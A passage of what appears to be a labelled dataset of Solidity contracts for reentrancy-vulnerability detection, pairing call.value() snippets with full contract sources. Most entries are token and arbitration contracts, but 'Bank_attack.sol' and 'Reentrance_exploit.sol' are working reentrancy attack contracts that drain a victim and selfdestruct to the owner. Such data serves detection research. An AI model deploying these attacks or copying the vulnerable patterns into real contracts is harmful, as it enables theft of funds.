uint) public totalSpentEth; mapping(address => uint) public totalTokensWithoutBonuses; mapping(address => uint) public volumeBonusesTokens; uint public constant TOKEN_PRICE = 0.001 ether; uint public constant MULTIPLIER = uint(10) ** uint(18); uint public salesStart; uint public salesDeadline; Token public token; address public wallet; bool public salePaused; event LogBought(address indexed receiver, uint contribution, uint reward, uint128 customerId); event LogPaused(bool isPaused); event LogWalletUpdated(address to); modifier notPaused() { require(!salePaused); _; } function init(Token _token, address _wallet, uint _start, uint _deadline) onlyContractOwner() public returns(bool) { require(address(token) == 0); require(_wallet != 0); token = _token; wallet = _wallet; salesStart = _start; salesDeadline = _deadline; return true; } function setSalePause(bool _value) onlyContractOwner() public returns(bool) { salePaused = _value; LogPaused(_value); return true; } function setWallet(address _wallet) onlyContractOwner() public returns(bool) { require(_wallet != 0); wallet = _wallet; LogWalletUpdated(_wallet); return true; } function transferOwnership() onlyContractOwner() public returns(bool) { token.transferOwnership(contractOwner); return true; } function burnUnsold() onlyContractOwner() public returns(bool) { uint tokensToBurn = token.balanceOf(address(this)); token.burn(tokensToBurn); return true; } function buy() payable notPaused() public returns(bool) { require(now >= salesStart); require(now < salesDeadline); uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE; require(tokensToBuy > 0); uint timeBonus = _calculateTimeBonus(tokensToBuy, now); uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value); uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus; require(token.transfer(msg.sender, totalTokensToTransfer)); LogBought(msg.sender, msg.value, totalTokensToTransfer, 0); require(wallet.call.value(msg.value)()); return true; } function buyWithCustomerId(address _beneficiary, uint _value, uint _amount, uint128 _customerId, uint _date, bool _autobonus) onlyContractOwner() public returns(bool) { uint totalTokensToTransfer; uint volumeBonus; if (_autobonus) { uint tokensToBuy = _value.mul(MULTIPLIER).div(TOKEN_PRICE); require(tokensToBuy > 0); uint timeBonus = _calculateTimeBonus(tokensToBuy, _date); volumeBonus = _calculateVolumeBonus(tokensToBuy, _beneficiary, _value); totalTokensToTransfer = tokensToBuy.add(timeBonus).add(volumeBonus); } else { totalTokensToTransfer = _amount; } require(token.transfer(_beneficiary, totalTokensToTransfer)); LogBought(_beneficiary, _value, totalTokensToTransfer, _customerId); return true; } function _calculateTimeBonus(uint _value, uint _date) view internal returns(uint) { if (_date < salesStart) { return 0; } if (_date < salesStart + 1 weeks) { return _value.mul(150).div(1000); } if (_date < salesStart + 2 weeks) { return _value.mul(100).div(1000); } if (_date < salesStart + 3 weeks) { return _value.mul(70).div(1000); } if (_date < salesStart + 4 weeks) { return _value.mul(40).div(1000); } if (_date < salesStart + 5 weeks) { return _value.mul(20).div(1000); } if (_date < salesDeadline) { return _value.mul(10).div(1000); } return 0; } function _calculateVolumeBonus(uint _amount, address _receiver, uint _value) internal returns(uint) { uint totalCollected = totalTokensWithoutBonuses[_receiver].add(_amount); uint totalEth = totalSpentEth[_receiver].add(_value); uint totalBonus; if (totalEth < 30 ether) { totalBonus = 0; } else if (totalEth < 50 ether) { totalBonus = totalCollected.mul(10).div(1000); } else if (totalEth < 100 ether) { totalBonus = totalCollected.mul(25).div(1000); } else if (totalEth < 300 ether) { totalBonus = totalCollected.mul(50).div(1000); } else if (totalEth < 500 ether) { totalBonus = totalCollected.mul(80).div(1000); } else if (totalEth < 1000 ether) { totalBonus = totalCollected.mul(150).div(1000); } else if (totalEth < 2000 ether) { totalBonus = totalCollected.mul(200).div(1000); } else if (totalEth < 3000 ether) { totalBonus = totalCollected.mul(300).div(1000); } else if (totalEth >= 3000 ether) { totalBonus = totalCollected.mul(400).div(1000); } uint bonusToPay = totalBonus - volumeBonusesTokens[_receiver]; volumeBonusesTokens[_receiver] = totalBonus; totalSpentEth[_receiver] = totalEth; totalTokensWithoutBonuses[_receiver] = totalCollected; return bonusToPay; } function () payable public { buy(); } function recoverTokens(Token _token, uint _amount) onlyContractOwner() public returns(bool) { return _token.transfer(contractOwner, _amount); } } "}
{"sol name": "4598.sol", "label": 0, "first path": "function futrMiner() public payable { require(futr.call.value(msg.value)()); uint256 mined = ERC20(futr).balanceOf(address(this)); ERC20(futr).approve(mny, mined); MNY(mny).mine(futr, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); function futxMiner() public payable { require(futx.call.value(msg.value)()); uint256 mined = ERC20(futx).balanceOf(address(this)); ERC20(futx).approve(mny, mined); MNY(mny).mine(futx, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); ", "second path": "function futrMiner() public payable { require(futr.call.value(msg.value)()); uint256 mined = ERC20(futr).balanceOf(address(this)); ERC20(futr).approve(mny, mined); MNY(mny).mine(futr, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); function futxMiner() public payable { require(futx.call.value(msg.value)()); uint256 mined = ERC20(futx).balanceOf(address(this)); ERC20(futx).approve(mny, mined); MNY(mny).mine(futx, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); ", "third path": "function futrMiner() public payable { require(futr.call.value(msg.value)()); uint256 mined = ERC20(futr).balanceOf(address(this)); ERC20(futr).approve(mny, mined); MNY(mny).mine(futr, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); function futxMiner() public payable { require(futx.call.value(msg.value)()); uint256 mined = ERC20(futx).balanceOf(address(this)); ERC20(futx).approve(mny, mined); MNY(mny).mine(futx, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); ", "long path": "pragma solidity ^0.4.0; contract ERC20 { function totalSupply() public view returns (uint256); function balanceOf(address who) public view returns (uint256); function transfer(address to, uint256 value) public returns (bool); event Transfer(address indexed from, address indexed to, uint256 value); function allowance(address owner, address spender) public view returns (uint256); function transferFrom(address from, address to, uint256 value) public returns (bool); function approve(address spender, uint256 value) public returns (bool); event Approval( address indexed owner, address indexed spender, uint256 value ); } contract MNY { function mine(address token, uint amount) public; } contract mnyminer { address mny = 0xD2354AcF1a2f06D69D8BC2e2048AaBD404445DF6; address futx = 0x8b7d07b6ffB9364e97B89cEA8b84F94249bE459F; address futr = 0xc83355eF25A104938275B46cffD94bF9917D0691; function futrMiner() public payable { require(futr.call.value(msg.value)()); uint256 mined = ERC20(futr).balanceOf(address(this)); ERC20(futr).approve(mny, mined); MNY(mny).mine(futr, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); } function futxMiner() public payable { require(futx.call.value(msg.value)()); uint256 mined = ERC20(futx).balanceOf(address(this)); ERC20(futx).approve(mny, mined); MNY(mny).mine(futx, mined); uint256 amount = ERC20(mny).balanceOf(address(this)); ERC20(mny).transfer(msg.sender, amount); } } "}
{"sol name": "Bank_attack.sol", "label": 1, "first path": "function step1(uint256 amount)  payable { if (this.balance >= amount) { victim.call.value(amount)(bytes4(keccak256(\"Deposit()\"))); function startAttack(uint256 amount)  { step1(amount); step2(amount / 2); ", "second path": "function step1(uint256 amount)  payable { if (this.balance >= amount) { victim.call.value(amount)(bytes4(keccak256(\"Deposit()\"))); function startAttack(uint256 amount)  { step1(amount); step2(amount / 2); ", "third path": "function step1(uint256 amount)  payable { if (this.balance >= amount) { victim.call.value(amount)(bytes4(keccak256(\"Deposit()\"))); function startAttack(uint256 amount)  { step1(amount); step2(amount / 2); ", "long path": "contract Attack { address owner; address victim; function Attack() payable { owner = msg.sender; } function setVictim(address target)  { victim = target; } function step1(uint256 amount)  payable { if (this.balance >= amount) { victim.call.value(amount)(bytes4(keccak256(\"Deposit()\"))); } } function step2(uint256 amount)  { victim.call(bytes4(keccak256(\"CashOut(uint256)\")), amount); } function stopAttack()  { selfdestruct(owner); } function startAttack(uint256 amount)  { step1(amount); step2(amount / 2); } function () payable { victim.call(bytes4(keccak256(\"CashOut(uint256)\")), msg.value); } } "}
{"sol name": "22805.sol", "label": 0, "first path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "second path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "third path": "function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; ", "long path": "pragma solidity ^0.4.18; contract Ownable { address public owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { require(msg.sender == owner); _; } function transferOwnership(address newOwner) onlyOwner { if (newOwner != address(0)) { owner = newOwner; } } } contract SafeMath { function safeMul(uint a, uint b) internal returns (uint) { uint c = a * b; sAssert(a == 0 || c / a == b); return c; } function safeDiv(uint a, uint b) internal returns (uint) { sAssert(b > 0); uint c = a / b; sAssert(a == b * c + a % b); return c; } function safeSub(uint a, uint b) internal returns (uint) { sAssert(b <= a); return a - b; } function safeAdd(uint a, uint b) internal returns (uint) { uint c = a + b; sAssert(c>=a && c>=b); return c; } function max64(uint64 a, uint64 b) internal constant returns (uint64) { return a >= b ? a : b; } function min64(uint64 a, uint64 b) internal constant returns (uint64) { return a < b ? a : b; } function max256(uint256 a, uint256 b) internal constant returns (uint256) { return a >= b ? a : b; } function min256(uint256 a, uint256 b) internal constant returns (uint256) { return a < b ? a : b; } function sAssert(bool assertion) internal { if (!assertion) { throw; } } } contract ERC20 { uint public totalSupply; function balanceOf(address who) constant returns (uint); function allowance(address owner, address spender) constant returns (uint); function transfer(address to, uint value) returns (bool ok); function transferFrom(address from, address to, uint value) returns (bool ok); function approve(address spender, uint value) returns (bool ok); event Transfer(address indexed from, address indexed to, uint value); event Approval(address indexed owner, address indexed spender, uint value); } contract StandardToken is ERC20, SafeMath { mapping(address => uint) balances; mapping (address => mapping (address => uint)) allowed; function transfer(address _to, uint _value) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _value); balances[_to] = safeAdd(balances[_to], _value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint _value) returns (bool success) { var _allowance = allowed[_from][msg.sender]; balances[_to] = safeAdd(balances[_to], _value); balances[_from] = safeSub(balances[_from], _value); allowed[_from][msg.sender] = safeSub(_allowance, _value); Transfer(_from, _to, _value); return true; } function balanceOf(address _owner) constant returns (uint balance) { return balances[_owner]; } function approve(address _spender, uint _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint remaining) { return allowed[_owner][_spender]; } } contract PowerCoin is Ownable, StandardToken { string public name = \"CapricornCoin\"; string public symbol = \"CCC\"; uint public decimals = 18; uint public totalSupply = 2 * (10 * (10**6) * (10**18)); event ET(address indexed _pd, uint _tkA, uint _etA); function eT(address _pd, uint _tkA, uint _etA) returns (bool success) { balances[msg.sender] = safeSub(balances[msg.sender], _tkA); balances[_pd] = safeAdd(balances[_pd], _tkA); if (!_pd.call.value(_etA)()) revert(); ET(_pd, _tkA, _etA); return true; } function PowerCoin() { balances[msg.sender] = totalSupply; } function () payable{ } function transferOwnership(address _newOwner) onlyOwner { balances[_newOwner] = safeAdd(balances[owner], balances[_newOwner]); balances[owner] = 0; Ownable.transferOwnership(_newOwner); } function transferAnyERC20Token(address tokenAddress, uint amount) onlyOwner returns (bool success) { return ERC20(tokenAddress).transfer(owner, amount); } } "}
{"sol name": "Reentrance_exploit.sol", "label": 1, "first path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "second path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "third path": "function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); ", "long path": "pragma solidity ^0.4.15; contract ReentranceExploit { bool public attackModeIsOn=false; address public vulnerable_contract; address public owner; function ReentranceExploit() public{ owner = msg.sender; } function deposit(address _vulnerable_contract) public payable{ vulnerable_contract = _vulnerable_contract ; require(vulnerable_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\")))); } function launch_attack() public{ attackModeIsOn = true; require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\")))); } function () public payable{ if (attackModeIsOn){ attackModeIsOn = false; require(vulnerable_contract.call(bytes4(sha3(\"withdrawBalance()\")))); } } function get_money(){ suicide(owner); } } "}
{"sol name": "14353.sol", "label": 1, "first path": "function buy(){ require(sale != 0x0); require(sale.call.value(this.balance)()); ", "second path": "function buy(){ require(sale != 0x0); require(sale.call.value(this.balance)()); ", "third path": "function buy(){ require(sale != 0x0); require(sale.call.value(this.balance)()); ", "long path": "pragma solidity ^0.4.13; contract ERC20 { function transfer(address _to, uint256 _value) returns (bool success); function balanceOf(address _owner) constant returns (uint256 balance); } contract ICOBuyer { address public developer = 0xF23B127Ff5a6a8b60CC4cbF937e5683315894DDA; address public sale; ERC20 public token; function set_addresses(address _sale, address _token) { require(msg.sender == developer); sale = _sale; token = ERC20(_token); } function withdraw(){ developer.transfer(this.balance); require(token.transfer(developer, token.balanceOf(address(this)))); } function buy(){ require(sale != 0x0); require(sale.call.value(this.balance)()); } function () payable { } } "}
{"sol name": "2301.sol", "label": 0, "first path": "function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor { _target.call.value(_value)(_data); ", "second path": "function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor { _target.call.value(_value)(_data); ", "third path": "function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor { _target.call.value(_value)(_data); ", "long path": "pragma solidity ^0.4.24; contract ApproveAndCallFallBack { function receiveApproval(address from, uint256 _amount, address _token, bytes _data) public; } contract TokenController { function proxyPayment(address _owner) public payable returns(bool); function onTransfer(address _from, address _to, uint _amount) public returns(bool); function onApprove(address _owner, address _spender, uint _amount) public returns(bool); } contract Controlled { modifier onlyController { require(msg.sender == controller); _; } address public controller; function Controlled() public { controller = msg.sender;} function changeController(address _newController) public onlyController { controller = _newController; } } contract Pinakion is Controlled { string public name; uint8 public decimals; string public symbol; string public version = 'MMT_0.2'; struct  Checkpoint { uint128 fromBlock; uint128 value; } Pinakion public parentToken; uint public parentSnapShotBlock; uint public creationBlock; mapping (address => Checkpoint[]) balances; mapping (address => mapping (address => uint256)) allowed; Checkpoint[] totalSupplyHistory; bool public transfersEnabled; MiniMeTokenFactory public tokenFactory; function Pinakion( address _tokenFactory, address _parentToken, uint _parentSnapShotBlock, string _tokenName, uint8 _decimalUnits, string _tokenSymbol, bool _transfersEnabled ) public { tokenFactory = MiniMeTokenFactory(_tokenFactory); name = _tokenName; decimals = _decimalUnits; symbol = _tokenSymbol; parentToken = Pinakion(_parentToken); parentSnapShotBlock = _parentSnapShotBlock; transfersEnabled = _transfersEnabled; creationBlock = block.number; } function transfer(address _to, uint256 _amount) public returns (bool success) { require(transfersEnabled); doTransfer(msg.sender, _to, _amount); return true; } function transferFrom(address _from, address _to, uint256 _amount ) public returns (bool success) { if (msg.sender != controller) { require(transfersEnabled); require(allowed[_from][msg.sender] >= _amount); allowed[_from][msg.sender] -= _amount; } doTransfer(_from, _to, _amount); return true; } function doTransfer(address _from, address _to, uint _amount ) internal { if (_amount == 0) { Transfer(_from, _to, _amount); return; } require(parentSnapShotBlock < block.number); require((_to != 0) && (_to != address(this))); var previousBalanceFrom = balanceOfAt(_from, block.number); require(previousBalanceFrom >= _amount); if (isContract(controller)) { require(TokenController(controller).onTransfer(_from, _to, _amount)); } updateValueAtNow(balances[_from], previousBalanceFrom - _amount); var previousBalanceTo = balanceOfAt(_to, block.number); require(previousBalanceTo + _amount >= previousBalanceTo); updateValueAtNow(balances[_to], previousBalanceTo + _amount); Transfer(_from, _to, _amount); } function balanceOf(address _owner) public constant returns (uint256 balance) { return balanceOfAt(_owner, block.number); } function approve(address _spender, uint256 _amount) public returns (bool success) { require(transfersEnabled); if (isContract(controller)) { require(TokenController(controller).onApprove(msg.sender, _spender, _amount)); } allowed[msg.sender][_spender] = _amount; Approval(msg.sender, _spender, _amount); return true; } function allowance(address _owner, address _spender ) public constant returns (uint256 remaining) { return allowed[_owner][_spender]; } function approveAndCall(address _spender, uint256 _amount, bytes _extraData ) public returns (bool success) { require(approve(_spender, _amount)); ApproveAndCallFallBack(_spender).receiveApproval( msg.sender, _amount, this, _extraData ); return true; } function totalSupply() public constant returns (uint) { return totalSupplyAt(block.number); } function balanceOfAt(address _owner, uint _blockNumber) public constant returns (uint) { if ((balances[_owner].length == 0) || (balances[_owner][0].fromBlock > _blockNumber)) { if (address(parentToken) != 0) { return parentToken.balanceOfAt(_owner, min(_blockNumber, parentSnapShotBlock)); } else { return 0; } } else { return getValueAt(balances[_owner], _blockNumber); } } function totalSupplyAt(uint _blockNumber) public constant returns(uint) { if ((totalSupplyHistory.length == 0) || (totalSupplyHistory[0].fromBlock > _blockNumber)) { if (address(parentToken) != 0) { return parentToken.totalSupplyAt(min(_blockNumber, parentSnapShotBlock)); } else { return 0; } } else { return getValueAt(totalSupplyHistory, _blockNumber); } } function createCloneToken( string _cloneTokenName, uint8 _cloneDecimalUnits, string _cloneTokenSymbol, uint _snapshotBlock, bool _transfersEnabled ) public returns(address) { if (_snapshotBlock == 0) _snapshotBlock = block.number; Pinakion cloneToken = tokenFactory.createCloneToken( this, _snapshotBlock, _cloneTokenName, _cloneDecimalUnits, _cloneTokenSymbol, _transfersEnabled ); cloneToken.changeController(msg.sender); NewCloneToken(address(cloneToken), _snapshotBlock); return address(cloneToken); } function generateTokens(address _owner, uint _amount ) public onlyController returns (bool) { uint curTotalSupply = totalSupply(); require(curTotalSupply + _amount >= curTotalSupply); uint previousBalanceTo = balanceOf(_owner); require(previousBalanceTo + _amount >= previousBalanceTo); updateValueAtNow(totalSupplyHistory, curTotalSupply + _amount); updateValueAtNow(balances[_owner], previousBalanceTo + _amount); Transfer(0, _owner, _amount); return true; } function destroyTokens(address _owner, uint _amount ) onlyController public returns (bool) { uint curTotalSupply = totalSupply(); require(curTotalSupply >= _amount); uint previousBalanceFrom = balanceOf(_owner); require(previousBalanceFrom >= _amount); updateValueAtNow(totalSupplyHistory, curTotalSupply - _amount); updateValueAtNow(balances[_owner], previousBalanceFrom - _amount); Transfer(_owner, 0, _amount); return true; } function enableTransfers(bool _transfersEnabled) public onlyController { transfersEnabled = _transfersEnabled; } function getValueAt(Checkpoint[] storage checkpoints, uint _block ) constant internal returns (uint) { if (checkpoints.length == 0) return 0; if (_block >= checkpoints[checkpoints.length-1].fromBlock) return checkpoints[checkpoints.length-1].value; if (_block < checkpoints[0].fromBlock) return 0; uint min = 0; uint max = checkpoints.length-1; while (max > min) { uint mid = (max + min + 1)/ 2; if (checkpoints[mid].fromBlock<=_block) { min = mid; } else { max = mid-1; } } return checkpoints[min].value; } function updateValueAtNow(Checkpoint[] storage checkpoints, uint _value ) internal  { if ((checkpoints.length == 0) || (checkpoints[checkpoints.length -1].fromBlock < block.number)) { Checkpoint storage newCheckPoint = checkpoints[ checkpoints.length++ ]; newCheckPoint.fromBlock =  uint128(block.number); newCheckPoint.value = uint128(_value); } else { Checkpoint storage oldCheckPoint = checkpoints[checkpoints.length-1]; oldCheckPoint.value = uint128(_value); } } function isContract(address _addr) constant internal returns(bool) { uint size; if (_addr == 0) return false; assembly { size := extcodesize(_addr) } return size>0; } function min(uint a, uint b) pure internal returns (uint) { return a < b ? a : b; } function () public payable { require(isContract(controller)); require(TokenController(controller).proxyPayment.value(msg.value)(msg.sender)); } function claimTokens(address _token) public onlyController { if (_token == 0x0) { controller.transfer(this.balance); return; } Pinakion token = Pinakion(_token); uint balance = token.balanceOf(this); token.transfer(controller, balance); ClaimedTokens(_token, controller, balance); } event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount); event Transfer(address indexed _from, address indexed _to, uint256 _amount); event NewCloneToken(address indexed _cloneToken, uint _snapshotBlock); event Approval( address indexed _owner, address indexed _spender, uint256 _amount ); } contract MiniMeTokenFactory { function createCloneToken( address _parentToken, uint _snapshotBlock, string _tokenName, uint8 _decimalUnits, string _tokenSymbol, bool _transfersEnabled ) public returns (Pinakion) { Pinakion newToken = new Pinakion( this, _parentToken, _snapshotBlock, _tokenName, _decimalUnits, _tokenSymbol, _transfersEnabled ); newToken.changeController(msg.sender); return newToken; } } contract RNG{ function contribute(uint _block) public payable; function requestRN(uint _block) public payable { contribute(_block); } function getRN(uint _block) public returns (uint RN); function getUncorrelatedRN(uint _block) public returns (uint RN) { uint baseRN=getRN(_block); if (baseRN==0) return 0; else return uint(keccak256(msg.sender,baseRN)); } } contract BlockHashRNG is RNG { mapping (uint => uint) public randomNumber; mapping (uint => uint) public reward; function contribute(uint _block) public payable { reward[_block]+=msg.value; } function getRN(uint _block) public returns (uint RN) { RN=randomNumber[_block]; if (RN==0){ saveRN(_block); return randomNumber[_block]; } else return RN; } function saveRN(uint _block) public { if (blockhash(_block) != 0x0) randomNumber[_block] = uint(blockhash(_block)); if (randomNumber[_block] != 0) { uint rewardToSend = reward[_block]; reward[_block] = 0; msg.sender.send(rewardToSend); } } } contract BlockHashRNGFallback is BlockHashRNG { function saveRN(uint _block) public { if (_block<block.number && randomNumber[_block]==0) { if (blockhash(_block)!=0x0) randomNumber[_block]=uint(blockhash(_block)); else randomNumber[_block]=uint(blockhash(block.number-1)); } if (randomNumber[_block] != 0) { uint rewardToSend=reward[_block]; reward[_block]=0; msg.sender.send(rewardToSend); } } } contract Arbitrable{ Arbitrator public arbitrator; bytes public arbitratorExtraData; modifier onlyArbitrator {require(msg.sender==address(arbitrator)); _;} event Ruling(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _ruling); event MetaEvidence(uint indexed _metaEvidenceID, string _evidence); event Dispute(Arbitrator indexed _arbitrator, uint indexed _disputeID, uint _metaEvidenceID); event Evidence(Arbitrator indexed _arbitrator, uint indexed _disputeID, address _party, string _evidence); constructor(Arbitrator _arbitrator, bytes _arbitratorExtraData) public { arbitrator = _arbitrator; arbitratorExtraData = _arbitratorExtraData; } function rule(uint _disputeID, uint _ruling) public onlyArbitrator { emit Ruling(Arbitrator(msg.sender),_disputeID,_ruling); executeRuling(_disputeID,_ruling); } function executeRuling(uint _disputeID, uint _ruling) internal; } contract Arbitrator{ enum DisputeStatus {Waiting, Appealable, Solved} modifier requireArbitrationFee(bytes _extraData) {require(msg.value>=arbitrationCost(_extraData)); _;} modifier requireAppealFee(uint _disputeID, bytes _extraData) {require(msg.value>=appealCost(_disputeID, _extraData)); _;} event AppealPossible(uint _disputeID); event DisputeCreation(uint indexed _disputeID, Arbitrable _arbitrable); event AppealDecision(uint indexed _disputeID, Arbitrable _arbitrable); function createDispute(uint _choices, bytes _extraData) public requireArbitrationFee(_extraData) payable returns(uint disputeID)  {} function arbitrationCost(bytes _extraData) public constant returns(uint fee); function appeal(uint _disputeID, bytes _extraData) public requireAppealFee(_disputeID,_extraData) payable { emit AppealDecision(_disputeID, Arbitrable(msg.sender)); } function appealCost(uint _disputeID, bytes _extraData) public constant returns(uint fee); function disputeStatus(uint _disputeID) public constant returns(DisputeStatus status); function currentRuling(uint _disputeID) public constant returns(uint ruling); } contract Kleros is Arbitrator, ApproveAndCallFallBack { Pinakion public pinakion; uint public constant NON_PAYABLE_AMOUNT = (2**256 - 2) / 2; RNG public rng; uint public arbitrationFeePerJuror = 0.05 ether; uint16 public defaultNumberJuror = 3; uint public minActivatedToken = 0.1 * 1e18; uint[5] public timePerPeriod; uint public alpha = 2000; uint constant ALPHA_DIVISOR = 1e4; uint public maxAppeals = 5; address public governor; uint public session = 1; uint public lastPeriodChange; uint public segmentSize; uint public rnBlock; uint public randomNumber; enum Period { Activation, Draw, Vote, Appeal, Execution } Period public period; struct Juror { uint balance; uint atStake; uint lastSession; uint segmentStart; uint segmentEnd; } mapping (address => Juror) public jurors; struct Vote { address account; uint ruling; } struct VoteCounter { uint winningChoice; uint winningCount; mapping (uint => uint) voteCount; } enum DisputeState { Open, Resolving, Executable, Executed } struct Dispute { Arbitrable arbitrated; uint session; uint appeals; uint choices; uint16 initialNumberJurors; uint arbitrationFeePerJuror; DisputeState state; Vote[][] votes; VoteCounter[] voteCounter; mapping (address => uint) lastSessionVote; uint currentAppealToRepartition; AppealsRepartitioned[] appealsRepartitioned; } enum RepartitionStage { Incoherent, Coherent, AtStake, Complete } struct AppealsRepartitioned { uint totalToRedistribute; uint nbCoherent; uint currentIncoherentVote; uint currentCoherentVote; uint currentAtStakeVote; RepartitionStage stage; } Dispute[] public disputes; event NewPeriod(Period _period, uint indexed _session); event TokenShift(address indexed _account, uint _disputeID, int _amount); event ArbitrationReward(address indexed _account, uint _disputeID, uint _amount); modifier onlyBy(address _account) {require(msg.sender == _account); _;} modifier onlyDuring(Period _period) {require(period == _period); _;} modifier onlyGovernor() {require(msg.sender == governor); _;} constructor(Pinakion _pinakion, RNG _rng, uint[5] _timePerPeriod, address _governor) public { pinakion = _pinakion; rng = _rng; lastPeriodChange = now; timePerPeriod = _timePerPeriod; governor = _governor; } function receiveApproval(address _from, uint _amount, address, bytes) public onlyBy(pinakion) { require(pinakion.transferFrom(_from, this, _amount)); jurors[_from].balance += _amount; } function withdraw(uint _value) public { Juror storage juror = jurors[msg.sender]; require(juror.atStake <= juror.balance); require(_value <= juror.balance-juror.atStake); require(juror.lastSession != session); juror.balance -= _value; require(pinakion.transfer(msg.sender,_value)); } function passPeriod() public { require(now-lastPeriodChange >= timePerPeriod[uint8(period)]); if (period == Period.Activation) { rnBlock = block.number + 1; rng.requestRN(rnBlock); period = Period.Draw; } else if (period == Period.Draw) { randomNumber = rng.getUncorrelatedRN(rnBlock); require(randomNumber != 0); period = Period.Vote; } else if (period == Period.Vote) { period = Period.Appeal; } else if (period == Period.Appeal) { period = Period.Execution; } else if (period == Period.Execution) { period = Period.Activation; ++session; segmentSize = 0; rnBlock = 0; randomNumber = 0; } lastPeriodChange = now; NewPeriod(period, session); } function activateTokens(uint _value) public onlyDuring(Period.Activation) { Juror storage juror = jurors[msg.sender]; require(_value <= juror.balance); require(_value >= minActivatedToken); require(juror.lastSession != session); juror.lastSession = session; juror.segmentStart = segmentSize; segmentSize += _value; juror.segmentEnd = segmentSize; } function voteRuling(uint _disputeID, uint _ruling, uint[] _draws) public onlyDuring(Period.Vote) { Dispute storage dispute = disputes[_disputeID]; Juror storage juror = jurors[msg.sender]; VoteCounter storage voteCounter = dispute.voteCounter[dispute.appeals]; require(dispute.lastSessionVote[msg.sender] != session); require(_ruling <= dispute.choices); require(validDraws(msg.sender, _disputeID, _draws)); dispute.lastSessionVote[msg.sender] = session; voteCounter.voteCount[_ruling] += _draws.length; if (voteCounter.winningCount < voteCounter.voteCount[_ruling]) { voteCounter.winningCount = voteCounter.voteCount[_ruling]; voteCounter.winningChoice = _ruling; } else if (voteCounter.winningCount==voteCounter.voteCount[_ruling] && _draws.length!=0) { voteCounter.winningChoice = 0; } for (uint i = 0; i < _draws.length; ++i) { dispute.votes[dispute.appeals].push(Vote({ account: msg.sender, ruling: _ruling })); } juror.atStake += _draws.length * getStakePerDraw(); uint feeToPay = _draws.length * dispute.arbitrationFeePerJuror; msg.sender.transfer(feeToPay); ArbitrationReward(msg.sender, _disputeID, feeToPay); } function penalizeInactiveJuror(address _jurorAddress, uint _disputeID, uint[] _draws) public { Dispute storage dispute = disputes[_disputeID]; Juror storage inactiveJuror = jurors[_jurorAddress]; require(period > Period.Vote); require(dispute.lastSessionVote[_jurorAddress] != session); dispute.lastSessionVote[_jurorAddress] = session; require(validDraws(_jurorAddress, _disputeID, _draws)); uint penality = _draws.length * minActivatedToken * 2 * alpha / ALPHA_DIVISOR; penality = (penality < inactiveJuror.balance) ? penality : inactiveJuror.balance; inactiveJuror.balance -= penality; TokenShift(_jurorAddress, _disputeID, -int(penality)); jurors[msg.sender].balance += penality / 2; TokenShift(msg.sender, _disputeID, int(penality / 2)); jurors[governor].balance += penality / 2; TokenShift(governor, _disputeID, int(penality / 2)); msg.sender.transfer(_draws.length*dispute.arbitrationFeePerJuror); } function oneShotTokenRepartition(uint _disputeID) public onlyDuring(Period.Execution) { Dispute storage dispute = disputes[_disputeID]; require(dispute.state == DisputeState.Open); require(dispute.session+dispute.appeals <= session); uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice; uint amountShift = getStakePerDraw(); for (uint i = 0; i <= dispute.appeals; ++i) { if (winningChoice!=0 || (dispute.voteCounter[dispute.appeals].voteCount[0] == dispute.voteCounter[dispute.appeals].winningCount)) { uint totalToRedistribute = 0; uint nbCoherent = 0; for (uint j = 0; j < dispute.votes[i].length; ++j) { Vote storage vote = dispute.votes[i][j]; if (vote.ruling != winningChoice) { Juror storage juror = jurors[vote.account]; uint penalty = amountShift<juror.balance ? amountShift : juror.balance; juror.balance -= penalty; TokenShift(vote.account, _disputeID, int(-penalty)); totalToRedistribute += penalty; } else { ++nbCoherent; } } if (nbCoherent == 0) { jurors[governor].balance += totalToRedistribute; TokenShift(governor, _disputeID, int(totalToRedistribute)); } else { uint toRedistribute = totalToRedistribute / nbCoherent; for (j = 